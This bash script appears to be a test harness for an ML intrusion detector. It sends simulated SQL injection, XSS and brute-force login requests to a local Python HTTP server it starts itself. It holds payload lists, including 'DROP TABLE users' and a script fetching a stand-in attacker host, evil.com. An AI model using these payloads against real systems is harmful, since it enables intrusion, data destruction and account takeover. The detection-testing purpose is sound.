#!/usr/bin/env bash

# Simulate web attacks: Brute Force, XSS, SQL Injection (CICIDS2017).
# Sends malicious HTTP request patterns from inside ns-research.
# Usage: sudo bash ubuntu/test/web_attacks.sh [port]
#   port default: 8080

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/_common.sh"

require_tool curl
check_ns

PORT="${1:-80}"
BASE="http://${HOST_IP}:${PORT}"

echo "WEB ATTACKS  (-> ${HOST_IP}:${PORT})"

echo "[*] Starting HTTP server on port ${PORT}..."
python3 -m http.server "$PORT" &>/dev/null &
SERVER_PID=$!
sleep 0.5

echo ""
echo "[*] SQL injection attempts (60 requests)..."
SQL_PAYLOADS=(
  "' OR '1'='1"
  "' OR 1=1--"
  "1; DROP TABLE users--"
  "' UNION SELECT null,null--"
  "admin'--"
)
for i in $(seq 1 60); do
  payload="${SQL_PAYLOADS[$((i % ${#SQL_PAYLOADS[@]}))]}"
  ns_exec curl -s -o /dev/null "${BASE}/?id=${payload}" || true
done

echo "[*] XSS attempts (60 requests)..."
XSS_PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "javascript:alert(document.cookie)"
  "'><script>fetch('http://evil.com')</script>"
)
for i in $(seq 1 60); do
  payload="${XSS_PAYLOADS[$((i % ${#XSS_PAYLOADS[@]}))]}"
  ns_exec curl -s -o /dev/null "${BASE}/?q=${payload}" || true
done

echo "[*] HTTP brute-force login attempts (80 requests)..."
for i in $(seq 1 80); do
  ns_exec curl -s -o /dev/null -X POST "${BASE}/login" \
    -d "username=admin&password=password${i}" || true
done

kill "$SERVER_PID" 2>/dev/null || true

echo ""
echo "[*] Done. 200 malicious HTTP requests sent."
echo "    Note: ML scores on flow features (bytes, duration, rate) not payload content."
echo "    XSS/SQLi may score lower than volumetric attacks unless flow patterns differ."